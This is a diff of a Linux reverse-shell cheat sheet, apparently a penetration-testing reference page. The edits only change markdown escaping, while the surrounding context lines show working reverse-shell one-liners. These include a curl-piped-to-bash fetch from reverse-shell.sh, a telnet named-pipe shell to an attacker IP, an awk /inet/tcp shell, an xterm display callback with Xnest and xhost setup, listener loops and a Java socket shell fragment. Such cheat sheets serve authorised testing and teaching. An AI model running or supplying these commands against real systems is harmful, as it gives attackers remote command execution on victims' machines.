@@ -1,12 +1,12 @@
 # Shells - Linux
 
-**If you have questions about any of these shells you could check them with** [**https://explainshell.com/**](https://explainshell.com/)\*\*\*\*
+**If you have questions about any of these shells you could check them with **[**https://explainshell.com/**](https://explainshell.com)****
 
 ## Full TTY
 
-**Once you get a reverse shell**[ **read this page to obtain a full TTY**](full-ttys.md)**.**
+**Once you get a reverse shell**[** read this page to obtain a full TTY**](full-ttys.md)**.**
 
-## Bash \| sh
+## Bash | sh
 
 ```bash
 curl http://reverse-shell.sh/1.1.1.1:3000 | bash
@@ -67,7 +67,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 while true; do nc -l <port>; done
 ```
 
-To send the command write it down, press enter and press CTRL+D \(to stop STDIN\)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)
 
 **Victim**
 
@@ -169,7 +169,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 
 ## OpenSSH
 
-Attacker \(Kali\)
+Attacker (Kali)
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
@@ -219,7 +219,7 @@ awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s;
 while true; do nc -l 79; done
 ```
 
-To send the command write it down, press enter and press CTRL+D \(to stop STDIN\)
+To send the command write it down, press enter and press CTRL+D (to stop STDIN)
 
 **Victim**
 
@@ -256,19 +256,19 @@ BEGIN {
 
 ## Xterm
 
-One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you \(10.0.0.1\) on TCP port 6001.
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.
 
 ```bash
 xterm -display 10.0.0.1:1
 ```
 
-To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\).  One way to do this is with Xnest \(to be run on your system\):
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
 
 ```bash
 Xnest :1
 ```
 
-You’ll need to authorise the target to connect to you \(command also run on your host\):
+You’ll need to authorise the target to connect to you (command also run on your host):
 
 ```bash
 xhost +targetip
@@ -294,6 +294,4 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 {% embed url="https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/" %}
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" %}
-
-
 
